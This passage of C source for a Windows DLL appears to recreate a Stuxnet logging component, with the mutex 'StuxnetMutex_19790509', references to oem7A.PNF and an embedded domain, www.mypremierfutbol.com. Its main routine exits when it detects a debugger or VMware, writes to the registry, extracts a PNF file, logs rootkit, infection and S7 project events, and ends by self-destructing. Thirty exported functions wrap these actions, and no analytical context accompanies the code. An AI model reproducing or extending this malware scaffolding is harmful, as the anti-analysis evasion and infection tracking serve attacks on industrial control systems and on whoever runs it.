        OEM6C_Cleanup();
        return FALSE;
    }
    hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        OEM6C_Cleanup();
        return FALSE;
    }
    if (OEM6C_CheckDebugger()) {
        CloseHandle(hMutex);
        OEM6C_Cleanup();
        return FALSE;
    }
    if (OEM6C_CheckVMware()) {
        CloseHandle(hMutex);
        OEM6C_Cleanup();
        return FALSE;
    }
    OEM6C_WriteRegistry();
    OEM6C_ReadRegistry();
    OEM6C_LoadLogFromDisk();
    OEM6C_ExtractAndSavePNF();
    OEM6C_LogRootkit();
    OEM6C_LogConnection(TRUE);
    OEM6C_LogS7PProject(L"\\SystemRoot\\inf\\oem7A.PNF", 3);
    OEM6C_LogNetwork(L"www.mypremierfutbol.com");
    OEM6C_SaveLogToDisk();
    OEM6C_StartWorker();
    while (WaitForSingleObject(g_Oem6cCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (OEM6C_IsExpired()) {
            break;
        }
        OEM6C_LogInfection(OEM6C_ENTRY_SUBTYPE_INFECTION_2);
        if (g_dwEntryCount > 100) {
            OEM6C_SaveLogToDisk();
        }
    }
    OEM6C_StopWorker();
    OEM6C_SaveLogToDisk();
    OEM6C_SelfDestruct();
    CloseHandle(hMutex);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            OEM6C_Cleanup();
            break;
        default:
            break;
    }
    return TRUE;
}

DWORD WINAPI Export1(VOID) {
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)OEM6C_Execute, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    return 0;
}

DWORD WINAPI Export2(VOID) {
    return OEM6C_ExtractAndSavePNF() ? 0 : 1;
}

DWORD WINAPI Export3(VOID) {
    return OEM6C_LoadLogFromDisk() ? 0 : 1;
}

DWORD WINAPI Export4(VOID) {
    return OEM6C_SaveLogToDisk() ? 0 : 1;
}

DWORD WINAPI Export5(VOID) {
    return OEM6C_AddLogEntry(OEM6C_ENTRY_TYPE_CONNECTION, OEM6C_ENTRY_SUBTYPE_CONNECTION_2, NULL, 0) ? 0 : 1;
}

DWORD WINAPI Export6(VOID) {
    BYTE bData[64];
    ZeroMemory(bData, 64);
    wcscpy_s((WCHAR*)bData, 32, L"\\SystemRoot\\inf\\oem7A.PNF");
    return OEM6C_AddLogEntry(OEM6C_ENTRY_TYPE_S7P_MCP, OEM6C_ENTRY_SUBTYPE_S7P_3, bData, (DWORD)(wcslen(L"\\SystemRoot\\inf\\oem7A.PNF") * 2)) ? 0 : 1;
}

DWORD WINAPI Export7(VOID) {
    BYTE bData[64];
    ZeroMemory(bData, 64);
    wcscpy_s((WCHAR*)bData, 32, L"www.mypremierfutbol.com");
    return OEM6C_AddLogEntry(OEM6C_ENTRY_TYPE_NETWORK, OEM6C_ENTRY_SUBTYPE_NETWORK_1, bData, (DWORD)(wcslen(L"www.mypremierfutbol.com") * 2)) ? 0 : 1;
}

DWORD WINAPI Export8(VOID) {
    BYTE bData[4];
    *(DWORD*)bData = GetTickCount();
    return OEM6C_AddLogEntry(OEM6C_ENTRY_TYPE_INFECTION, OEM6C_ENTRY_SUBTYPE_INFECTION_2, bData, 4) ? 0 : 1;
}

DWORD WINAPI Export9(VOID) {
    BYTE bData[4];
    *(DWORD*)bData = 0x00000001;
    return OEM6C_AddLogEntry(OEM6C_ENTRY_TYPE_ROOTKIT, OEM6C_ENTRY_SUBTYPE_ROOTKIT_5, bData, 4) ? 0 : 1;
}

DWORD WINAPI Export10(VOID) {
    return OEM6C_WriteRegistry() ? 0 : 1;
}

DWORD WINAPI Export11(VOID) {
    return OEM6C_ReadRegistry() ? 0 : 1;
}

DWORD WINAPI Export12(VOID) {
    return OEM6C_StartWorker() ? 0 : 1;
}

DWORD WINAPI Export13(VOID) {
    OEM6C_StopWorker();
    return 0;
}

DWORD WINAPI Export14(VOID) {
    OEM6C_SelfDestruct();
    return 0;
}

DWORD WINAPI Export15(VOID) {
    return (DWORD)g_Oem6cCtx.dwPid;
}

DWORD WINAPI Export16(VOID) {
    return OEM6C_VERSION;
}

DWORD WINAPI Export17(VOID) {
    return g_dwInfectionCount;
}

DWORD WINAPI Export18(VOID) {
    return g_dwLogWriteCount;
}

DWORD WINAPI Export19(VOID) {
    return g_dwLogReadCount;
}

DWORD WINAPI Export20(VOID) {
    return g_dwEntryCount;
}

DWORD WINAPI Export21(VOID) {
    return (DWORD)g_Oem6cCtx.hMutex;
}

DWORD WINAPI Export22(VOID) {
    return OEM6C_LogConnection(TRUE) ? 0 : 1;
}

DWORD WINAPI Export23(VOID) {
    return OEM6C_LogConnection(FALSE) ? 0 : 1;
}

DWORD WINAPI Export24(LPCWSTR szPath) {
    return OEM6C_LogS7PProject(szPath, 3) ? 0 : 1;
}

DWORD WINAPI Export25(LPCWSTR szServerName) {
    return OEM6C_LogNetwork(szServerName) ? 0 : 1;
}

DWORD WINAPI Export26(VOID) {
    return OEM6C_LogInfection(OEM6C_ENTRY_SUBTYPE_INFECTION_2) ? 0 : 1;
}

DWORD WINAPI Export27(VOID) {
    return OEM6C_LogInfection(OEM6C_ENTRY_SUBTYPE_INFECTION_5) ? 0 : 1;
}

DWORD WINAPI Export28(VOID) {
    return OEM6C_LogInfection(OEM6C_ENTRY_SUBTYPE_INFECTION_6) ? 0 : 1;
}

DWORD WINAPI Export29(VOID) {
    return OEM6C_LogInfection(OEM6C_ENTRY_SUBTYPE_INFECTION_7) ? 0 : 1;
}

DWORD WINAPI Export30(VOID) {
    return OEM6C_LogInfection(OEM6C_ENTRY_SUBTYPE_INFECTION_8) ? 0 : 1;
}